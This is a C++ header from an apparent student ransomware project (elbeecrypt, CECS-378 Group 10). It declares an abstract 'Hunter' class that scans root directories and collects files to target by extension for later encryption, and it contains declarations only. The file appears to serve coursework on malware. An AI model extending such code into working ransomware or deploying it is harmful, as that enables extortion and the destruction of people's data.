#pragma once

#include <filesystem>
#include <string>
#include <vector>

namespace fs = std::filesystem;

namespace elbeecrypt::common::io {
	/**
	 * @brief Contains the piece of the ransomware that actually seeks
	 * out and acts on files. This class is meant to be subclassed,
	 * such that functionality for encryption and decryption is distinct.
	 * This class should serve as a common base, and not contain any
	 * logic to handle cryptography or attacks. This class is also 
	 * abstract and mustn't be used directly. Use subclasses of this
	 * class instead.
	 * 
	 * @author CECS-378 Group 10
	 * @file hunter.hpp
	 */
	class Hunter {
		//Fields
		protected:
			/** The list of root paths to start from. */
			std::vector<fs::path> _roots;

			/** The list of found paths. */
			std::vector<fs::path> targets;


		//Constructors & Destructor
		public:
			/**
			 * @brief Constructs a new Hunter object with a list 
			 * of root paths to scan for targets.
			 * 
			 * @param roots The root paths to start from
			 */
			Hunter(const std::vector<fs::path>& roots);

			/**
			 * @brief Destroys the Hunter object.
			 */
			virtual ~Hunter() = default;


		//Getters
		public:
			/**
			 * @brief Gets the list of root paths to start scanning from.
			 * 
			 * @return The list of root paths to start scanning from
			 */
			std::vector<fs::path> getRoots();

			/**
			 * @brief Gets the list of target files that were found.
			 * 
			 * @return The list of target files that were found
			 */
			std::vector<fs::path> getTargets();


		//Methods
		public:
			/**
			 * @brief Returns the string representation of this object.
			 * 
			 * @return The string representation of this object
			 */
			std::string toString();


		//Operator overloads
		public:
			/**
			 * @brief Returns the string representation of this object. 
			 * Also allows for implicit string casting. 
			 * 
			 * @return The string representation of this object
			 */
			operator std::string();


		//Abstract methods
		protected:
			/**
			 * @brief Checks if a path is targetable or not. The check is
			 * based on the extension of the file in question. This is an
			 * abstract method and is meant to be overridden in subclasses.
			 * 
			 * @param path The path to check
			 * @param depth The depth of the file from the starting directory
			 * @return Whether the current path is targetable
			 */
			virtual bool isTargetable(const fs::path& path, const uint32_t& depth) = 0;


		//Private methods
		protected:
			/**
			 * @brief Hunts out files to target.
			 * 
			 * @param roots The root paths to start from
			 */
			void hunt(const std::vector<fs::path>& roots);
	};
}